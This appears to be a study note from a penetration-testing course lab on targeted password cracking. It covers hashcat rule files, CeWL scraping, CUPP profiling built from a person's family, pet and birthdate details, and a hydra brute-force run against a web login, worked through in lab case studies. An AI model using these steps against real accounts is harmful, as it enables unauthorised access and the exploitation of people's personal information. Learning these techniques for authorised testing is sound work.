# Custom Wordlists and Rules

## Common Password Patterns
Users often follow predictable patterns when creating passwords:

- **First letter uppercase**: Password
- **Adding numbers**: Password123
- **Adding year**: Password2022
- **Adding month**: Password02
- **Exclamation at end**: Password2022!
- **Special characters**: P@ssw0rd2022!

## OSINT for Password Creation
Collect information about target users:
- Company name
- Personal interests, hobbies
- Pet names
- Family members
- Sports teams
- Birth dates/years
- Geographic location

## Hashcat Rule Functions
| Function | Description |
|----------|-------------|
| `:` | Do nothing |
| `l` | Lowercase all letters |
| `u` | Uppercase all letters |
| `c` | Capitalize first letter, lowercase others |
| `sXY` | Replace all instances of X with Y |
| `$!` | Add exclamation at end |
| `^X` | Prepend character X |
| `]` | Delete last character |
| `[` | Delete first character |
| `$1` `$2` `$3` | Append digits |

## Creating Custom Rules
Example rule file:
```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

## Generating Wordlists with Rules
```bash
# Apply rules to wordlist
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Combine multiple wordlists
cat list1.txt list2.txt | sort -u > combined.txt
```

## CeWL - Website Wordlist Generation
```bash
# Basic usage
cewl https://target-company.com -d 4 -m 6 --lowercase -w company.wordlist

# Advanced options
cewl https://target-company.com \
  -d 4 \           # Depth to spider
  -m 6 \           # Minimum word length
  --lowercase \    # Convert to lowercase
  -w wordlist.txt  # Output file
```

## Targeted Password Attack Strategy

### 1. Information Gathering
- Company website
- Social media profiles
- Employee LinkedIn profiles
- Company documents/presentations
- Geographic information

### 2. Base Wordlist Creation
```bash
# Create base wordlist from gathered info
echo "nexura" >> base.txt
echo "bella" >> base.txt
echo "maria" >> base.txt
echo "alex" >> base.txt
echo "baseball" >> base.txt
echo "francisco" >> base.txt
echo "august" >> base.txt
echo "1998" >> base.txt
```

### 3. Rule Creation for Password Policy
For policy: 12+ chars, uppercase, lowercase, symbol, number
```bash
# Example rules for 12+ character passwords
c $1 $9 $9 $8 $!        # Capitalize + year + !
c $0 $8 $0 $5 $!        # Capitalize + date + !
c $2 $0 $2 $2 $@        # Capitalize + year + @
u $1 $2 $3 $4 $!        # Uppercase + numbers + !
```

### 4. Generation and Testing
```bash
# Generate mutated wordlist
hashcat --force base.txt -r custom.rule --stdout | sort -u > targeted.txt

# Test against hash
hashcat -a 0 -m 0 hash.txt targeted.txt
```

## Common Rule Files
- `best64.rule` - 64 common transformations
- `rockyou-30000.rule` - Based on rockyou analysis
- `T0XlC.rule` - Advanced transformations
- `dive.rule` - Comprehensive rule set

## Tips for Custom Wordlists
1. **Start with OSINT** - Gather target-specific information
2. **Consider password policy** - Adapt rules to requirements
3. **Use company-specific terms** - Include company name, products, locations
4. **Personal information** - Names, dates, interests
5. **Geographic relevance** - Local sports teams, landmarks
6. **Seasonal/temporal** - Current year, month, season
7. **Industry-specific terms** - Technical jargon, common terms

## Example Workflow
```bash
# 1. Gather words from company website
cewl https://company.com -d 3 -m 5 --lowercase -w company.txt

# 2. Create personal wordlist
echo -e "employeename\npetname\nspouse\nchildren" > personal.txt

# 3. Combine lists
cat company.txt personal.txt | sort -u > combined.txt

# 4. Apply targeted rules
hashcat --force combined.txt -r custom.rule --stdout > final.txt

# 5. Attack hash
hashcat -a 0 -m 0 hash.txt final.txt
```

## Practical Example: Mark White Case Study

**Target Information:**
- Name: Mark White
- DOB: August 5, 1998
- Company: Nexura Ltd
- Location: San Francisco, CA
- Pet: Bella (cat)
- Family: Maria (wife), Alex (son)
- Interest: Baseball
- Password Policy: 12+ chars, uppercase, lowercase, symbol, number

### Step 1: Create Base Wordlist
```bash
cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
```

### Step 2: Create Custom Rules
```bash
cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF
```

**Rule Explanation:**
- `c` - Capitalize first character, lowercase rest
- `C` - Lowercase first character, uppercase rest  
- `t` - Toggle case of all characters
- `$!` - Append exclamation mark
- `$1$9$9$8` - Append '1998'
- `$1$9$9$8$!` - Append '1998!'
- `sa@` - Replace 'a' with '@'
- `so0` - Replace 'o' with '0'
- `ss$` - Replace 's' with '$'

### Step 3: Generate Mutated Wordlist
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### Step 4: Crack the Hash
```bash
# Hash: 97268a8ae45ac7d15c3cea4ce6ea550b
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
```

### Step 5: Retrieve Results
```bash
hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b --show
```

This approach successfully cracked Mark's password by combining:
- Personal/professional information (OSINT)
- Password policy requirements
- Common password patterns
- Targeted rule transformations

---

## HTB Academy Custom Wordlists Workflow

### Tools Installation
```bash
# Install CUPP (Common User Passwords Profiler)
sudo apt install cupp -y

# Clone username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git
```

### Real-World Scenario: Jane Smith

**Target Information (OSINT):**
- Name: Jane Smith
- Nickname: Janey
- Birthdate: 11/12/1990
- Partner: Jim (nickname: Jimbo, DOB: 12/12/1990)
- Pet: Spot
- Company: AHI

### Step 1: Generate Username Variations
```bash
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt

# Generated usernames:
# jane, jsmith, jane.smith, smith.jane, j.smith, smithj, etc.
```

### Step 2: CUPP Interactive Password Generation
```bash
cupp -i

# Interactive prompts:
# First Name: Jane  
# Surname: Smith
# Nickname: Janey
# Birthdate (DDMMYYYY): 11121990
# Partners name: Jim
# Partners nickname: Jimbo
# Partners birthdate (DDMMYYYY): 12121990
# Pet's name: Spot
# Company name: AHI
# Key words: [company-specific terms]
# Special chars at end: Y
# Random numbers at end: Y
# Leet mode: Y

# Output: jane.txt (43,222 words)
```

### Step 3: Password Complexity Filtering
```bash
# Filter for policy: 6+ chars, uppercase, lowercase, numbers, 2+ special chars
grep -E '^.{6,}$' jane.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# Breakdown:
# '^.{6,}$'                - 6+ characters
# '[A-Z]'                  - At least one uppercase
# '[a-z]'                  - At least one lowercase  
# '[0-9]'                  - At least one digit
# '([!@#$%^&*].*){2,}'     - At least 2 special characters
```

### Step 4: Targeted Brute Force Attack
```bash
# HTTP POST form brute force with custom wordlists
hydra -L jane_smith_usernames.txt -P jane-filtered.txt \
      TARGET_IP -s PORT -f \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

# Expected result:
# [PORT][http-post-form] host: TARGET_IP   login: jane   password: 3n4J!!
```

### Step 5: Success and Flag Retrieval
```bash
# Login with discovered credentials
# Username: jane
# Password: 3n4J!!
# Navigate to target and retrieve flag
```

---

## Advanced Filtering Techniques

### Password Policy Compliance
```bash
# Example policies and corresponding grep filters:

# Policy: 8-16 chars, 1 upper, 1 lower, 1 digit, 1 special
grep -E '^.{8,16}$' wordlist.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '[!@#$%^&*()_+=-]' > policy_compliant.txt

# Policy: No dictionary words (basic check)
grep -vE '^(password|admin|user|test|login)' wordlist.txt > no_common.txt

# Policy: Must contain company name (case insensitive)
grep -iE 'companyname' wordlist.txt > company_passwords.txt

# Policy: Must start with capital letter
grep -E '^[A-Z]' wordlist.txt > capital_start.txt
```

### Wordlist Quality Control
```bash
# Remove duplicates and sort
sort -u wordlist.txt > clean_wordlist.txt

# Remove passwords shorter than minimum length
awk 'length($0) >= 8' wordlist.txt > min_length.txt

# Count passwords by length
awk '{print length($0)}' wordlist.txt | sort -n | uniq -c

# Remove blank lines
sed '/^$/d' wordlist.txt > no_blanks.txt
```

### Targeted Attack Strategy Summary
1. **OSINT Collection** - Personal/professional information
2. **Username Generation** - username-anarchy variations  
3. **Password Profiling** - CUPP interactive generation
4. **Policy Filtering** - grep compliance checking
5. **Targeted Attack** - Hydra with custom wordlists
6. **Success Validation** - Login and objective completion 